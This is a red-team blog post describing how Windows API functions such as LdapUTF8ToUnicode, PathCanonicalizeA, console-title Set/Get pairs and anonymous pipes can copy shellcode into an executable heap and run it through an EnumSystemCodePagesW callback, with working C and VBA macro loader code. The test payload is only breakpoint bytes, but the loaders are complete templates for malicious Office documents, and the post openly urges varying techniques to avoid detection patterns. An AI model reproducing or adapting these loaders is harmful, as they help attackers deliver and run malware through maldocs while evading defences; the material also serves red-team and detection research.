---
title: "One thousand and one ways to copy your shellcode to memory (VBA Macros)"
date: 2021-02-18 00:00:00 +00:00
modified: 2021-02-18 00:00:00 +00:00
tags: [red team, research, X-C3LL]
description: Alternative ways to copy your shellcode to memory in your VBA macros
image: 
---

Dear Fell**owl**ship, today's homily is about how we can (ab)use different native Windows functions to copy our shellcode to a RWX section in our VBA Macros. 


# Prayers at the foot of the Altar a.k.a. disclaimer
*The topic is __old__ and basic, but with the recent analysis of the Lazarus' maldocs it feels like discussing this technique may come in handy at this moment.*

# Introduction
As shown by NCC in his article "[RIFT: Analysing a Lazarus Shellcode Execution Method](https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/)" Lazarus Group used maldocs where the shellcode is loaded and executed without calling any of the classical functions. To achieve it the VBA macro used `UuidFromStringA` to copy the shellcode to the RWX region and then triggered its execution via `lpLocaleEnumProc`. The `lpLocaleEnumProc` was previously documented by [@noottrak](https://twitter.com/noottrak) in his article "[Abusing native Windows functions for shellcode execution](http://ropgadget.com/posts/abusing_win_functions.html)".

Using alternatives ways to copy the shellcode is nothing new, even there are a few articles about discussing it for inter-process injections ([Inserting data into other processes’ address space](https://www.hexacorn.com/blog/2019/05/18/inserting-data-into-other-processes-address-space/) by [@Hexacorn](https://twitter.com/Hexacorn), [GetEnvironmentVariable as an alternative to WriteProcessMemory in process injections](https://x-c3ll.github.io/posts/GetEnvironmentVariable-Process-Injection/) by [@TheXC3LL](https://twitter.com/TheXC3LL) and [Windows Process Injection: Command Line and Environment Variables](Windows Process Injection: Command Line and Environment Variables) by [@modexpblog](https://twitter.com/modexpblog), just to metion a few). 

Returning to [@nootrak](https://twitter.com/noottrak)'s article we can find a list of different native functions which can be used to trigger the execution, and even a [tool](https://github.com/karttoon/trigen) to build _maldocs_ where the functions used to allocate, copy, and execute the shellcode are randomly chosen. Quoted from the article:

_I'm calling trigen (think 3 combo-generator) which randomly puts together a VBA macro using API calls from pools of functions for allocating memory (4 total), **copying shellcode to memory (2 total)**, and then finally abusing the Win32 function call to get code execution (48 total - I left SetWinEventHook out due to aforementioned need to chain functions). In total, there are 384 different possible macro combinations that it can spit out._

The tool uses only 2 native functions to copy the shellcode, when there are dozens of them that can be used. So the number of possible combinations can grow A LOT.

In an extremely abstract way we can label the functions that can be (ab)used in two labels: **one-shot functions** and **two-shot functions**. The first family of functions are those that let you copy the shellcode directly to the desired address (for example, `UuidFromStringA` used by Lazarus); meanwhile two-shot functions are those where the copy has to be done in two-steps: first copy the shellcode to *no man's land*, and then retrieve it (for example, `SetEnvironmentVariable`/`GetEnvironmentVariable`)


# One-shot functions
Most of the functions falling into this category are functions used to convert info from format "A" to format "B", or those applying any type of transformation to this info. This kind of functions can be spotted checking their arguments: if it receives an input buffer and an output buffer, it is a good candidate. Let's check `LdapUTF8ToUnicode` for example:

```c
WINLDAPAPI int LDAPAPI LdapUTF8ToUnicode(
  LPCSTR lpSrcStr,
  int    cchSrc,
  LPWSTR lpDestStr,
  int    cchDest
);
``` 

So, the parameters are:

```
lpSrcStr - A pointer to a null-terminated UTF-8 string to convert.
lpDestStr - A pointer to a buffer that receives the converted Unicode string, without a null terminator.
```

This is a good candidate that meets our criteria. We can test it with a simple PoC in C:

```c
#include <Windows.h>
#include <Winldap.h>

#pragma comment(lib, "wldap32.lib")

int main(int argc, char** argv) {
	LPCSTR orig_shellcode = "\xec\xb3\x8c\xec\xb3\x8c"; // \xcc\xcc\xcc\xcc in UNICODE
	LPWSTR copied_shellcode = NULL;
	HANDLE heap = NULL;
	int ret = 0;
	int size = 0;
	
	heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	copied_shellcode = HeapAlloc(heap, 0, 0x10);
	size = LdapUTF8ToUnicode(orig_shellcode, strlen(orig_shellcode), NULL, 0); // First call is to know the size
	ret = LdapUTF8ToUnicode(orig_shellcode, strlen(orig_shellcode), copied_shellcode, size);
	EnumSystemCodePagesW(copied_shellcode, 0); // Just to trigger the execution. Taken from Nootrak article.
	return 0;
}
```
As this function works doing a conversion from UTF-8 to UNICODE, we have to craft our shellcode (in this case just a bunch of int3) keeping this in mind.

<figure>
<img src="/alternatives-copy-shellcode/ldaputf8tounicode-vscode.png" alt="Shellcode copied to our target RWX buffer">
<figcaption>
Shellcode copied to our target RWX buffer.
</figcaption>
</figure>

As we saw, it worked. It is time to translate the C code to the impious language of ~~Mordor~~ VBA:

```vb
Private Declare PtrSafe Function HeapCreate Lib "KERNEL32" (ByVal flOptions As Long, ByVal dwInitialSize As LongPtr, ByVal dwMaximumSize As LongPtr) As LongPtr
Private Declare PtrSafe Function HeapAlloc Lib "KERNEL32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal dwBytes As LongPtr) As LongPtr
Private Declare PtrSafe Function EnumSystemCodePagesW Lib "KERNEL32" (ByVal lpCodePageEnumProc As LongPtr, ByVal dwFlags As Long) As Long
Private Declare PtrSafe Function LdapUTF8ToUnicode Lib "WLDAP32" (ByVal lpSrcStr As LongPtr, ByVal cchSrc As Long, ByVal lpDestStr As LongPtr, ByVal cchDest As Long) As Long


Sub poc()
    Dim orig_shellcode(0 To 5) As Byte
    Dim copied_shellcode As LongPtr
    Dim heap As LongPtr
    Dim size As Long
    Dim ret As Long
    Dim HEAP_CREATE_ENABLE_EXECUTE As Long
    
    HEAP_CREATE_ENABLE_EXECUTE = &H40000
    
    '\xec\xb3\x8c\xec\xb3\x8c ==> \xcc\xcc\xcc\xcc
    orig_shellcode(0) = &HEC
    orig_shellcode(1) = &HB3
    orig_shellcode(2) = &H8C
    orig_shellcode(3) = &HEC
    orig_shellcode(4) = &HB3
    orig_shellcode(5) = &H8C
    
    heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
    copied_shellcode = HeapAlloc(heap, 0, &H10)
    size = LdapUTF8ToUnicode(VarPtr(orig_shellcode(0)), 6, 0, 0)
    ret = LdapUTF8ToUnicode(VarPtr(orig_shellcode(0)), 6, copied_shellcode, size)
    ret = EnumSystemCodePagesW(copied_shellcode, 0)
End Sub
``` 

Attach a debugger and run the macro!

<figure>
<img src="/alternatives-copy-shellcode/vba-ldap-executed.png" alt="Macro executing our shellcode">
<figcaption>
Macro executing our shellcode.
</figcaption>
</figure>

Another example can be `PathCanonicalize`:

```c
BOOL PathCanonicalizeA(
  LPSTR  pszBuf,
  LPCSTR pszPath
);
```

The parameters meets our criteria:

```
pszBuf - A pointer to a string that receives the canonicalized path. You must set the size of this buffer to MAX_PATH to ensure that it is large enough to hold the returned string.

pszPath -  pointer to a null-terminated string of maximum length MAX_PATH that contains the path to be canonicalized.
```

The PoC:

```c
#include <Windows.h>
#include <Shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

int main(int argc, char** argv) {
	LPCSTR orig_shellcode = "\xcc\xcc\xcc\xcc";
	LPSTR copied_shellcode = NULL;
	HANDLE heap = NULL;
	BOOL ret = 0;
	int size = 0;

	heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	copied_shellcode = HeapAlloc(heap, 0, 0x10);
	PathCanonicalizeA(copied_shellcode, orig_shellcode);
	EnumSystemCodePagesW(copied_shellcode, 0);
	return 0;
}
```

Aaand fire in the hole!

<figure>
<img src="/alternatives-copy-shellcode/canon.png" alt="Shellcode copied to RWX buffer using PathCanonicalizeA">
<figcaption>
Shellcode copied to RWX buffer using PathCanonicalizeA.
</figcaption>
</figure>

# Two-shots functions

With this label we are referring to functions that first need to save the shellcode in a intermediate place, like an environment variable/window title/etc, and then retrieve it from that place. The easiest to spot are the **Set**/**Get** twins. 

A simple example that comes to our mind is saving the shellcode as a Console Tittle with `SetConsoleTitleA` and then calling `GetConsoleTitleA` to save it in our RWX region:

```c
#include <Windows.h>

int main(int argc, char** argv) {
	LPCSTR orig_shellcode = "\xcc\xcc\xcc\xcc";
	LPSTR copied_shellcode = NULL;
	HANDLE heap = NULL;
	BOOL ret = 0;

	heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	copied_shellcode = HeapAlloc(heap, 0, 0x10);
	SetConsoleTitleA(orig_shellcode);
	GetConsoleTitleA(copied_shellcode, MAX_PATH);
	EnumSystemCodePagesW(copied_shellcode, 0);
	return 0;
}
```

Test it:

<figure>
<img src="/alternatives-copy-shellcode/two-shots.png" alt="Shellcode copied using a Set/Get pair">
<figcaption>
Shellcode copied using a Set/Get pair.
</figcaption>
</figure>


Also IPC mechanisms can fall into our "two-shots" category. For example, we can create an anonymous pipe to use it as *no man's place* and call `WriteFile`/`ReadFile` to copy the shellcode:

```c
#include <Windows.h>

int main(int argc, char** argv) {
	LPCSTR orig_shellcode = "\xcc\xcc\xcc\xcc";
	LPSTR copied_shellcode = NULL;
	HANDLE heap = NULL;
	HANDLE source = NULL;
	HANDLE sink = NULL;
	SECURITY_ATTRIBUTES saAttr;
	DWORD size = 0;

	heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	copied_shellcode = HeapAlloc(heap, 0, 0x10);

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	CreatePipe(&sink, &source, &saAttr, 0);
	WriteFile(source, orig_shellcode, 4, &size, NULL);
	ReadFile(sink, copied_shellcode, 4, &size, NULL);

	EnumSystemCodePagesW(copied_shellcode, 0);
	return 0;
}
```

It can be translated to VBA as:

```vb
Private Declare PtrSafe Function HeapCreate Lib "kernel32" (ByVal flOptions As Long, ByVal dwInitialSize As LongPtr, ByVal dwMaximumSize As LongPtr) As LongPtr
Private Declare PtrSafe Function HeapAlloc Lib "kernel32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal dwBytes As LongPtr) As LongPtr
Private Declare PtrSafe Function EnumSystemCodePagesW Lib "kernel32" (ByVal lpCodePageEnumProc As LongPtr, ByVal dwFlags As Long) As Long
Private Declare PtrSafe Function CreatePipe Lib "kernel32" (phReadPipe As LongPtr, phWritePipe As LongPtr, lpPipeAttributes As SECURITY_ATTRIBUTES, ByVal nSize As Long) As Long
Private Declare PtrSafe Function ReadFile Lib "kernel32" (ByVal hFile As LongPtr, ByVal lpBuffer As LongPtr, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, lpOverlapped As Long) As Long
Private Declare PtrSafe Function WriteFile Lib "kernel32" (ByVal hFile As LongPtr, ByVal lpBuffer As LongPtr, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, lpOverlapped As Long) As Long


Private Type SECURITY_ATTRIBUTES
        nLength As Long
        lpSecurityDescriptor As LongPtr
        bInheritHandle As Long
End Type

Sub poc()
    Dim orig_shellcode(0 To 3) As Byte
    Dim copied_shellcode As LongPtr
    Dim heap As LongPtr
    Dim size As Long
    Dim ret As Long
    Dim source As LongPtr
    Dim sink As LongPtr
    Dim saAttr As SECURITY_ATTRIBUTES
    Dim HEAP_CREATE_ENABLE_EXECUTE As Long
    
    HEAP_CREATE_ENABLE_EXECUTE = &H40000
    
    orig_shellcode(0) = &HCC
    orig_shellcode(1) = &HCC
    orig_shellcode(2) = &HCC
    orig_shellcode(3) = &HCC
    
    heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
    copied_shellcode = HeapAlloc(heap, 0, &H10)
    
    saAttr.nLength = LenB(SECURITY_ATRIBUTES)
    saAttr.bInheritHandle = 1
    saAttr.lpSecurityDescriptor = 0
    
    ret = CreatePipe(sink, source, saAttr, 0)
    ret = WriteFile(source, VarPtr(orig_shellcode(0)), 4, size, 0)
    ret = ReadFile(sink, copied_shellcode, 4, size, 0)
    ret = EnumSystemCodePagesW(copied_shellcode, 0)
End Sub
```



# EoF

Although the topic discussed in this article is old, we tend to see always the same patterns (probably just because people repeats what it is highly shared in internet). We encourage to explore alternatives ways to do the things and not just follow blindly what others do. 

As Red Teamers we have to repeat TTPs seen in the wild but also we need to explore more paths. **There are dozens of ways to copy and trigger your shellcode, just don't stick to one and be creative!**

We hope you enjoyed this reading! Feel free to give us feedback at our twitter [@AdeptsOf0xCC](https://twitter.com/AdeptsOf0xCC).

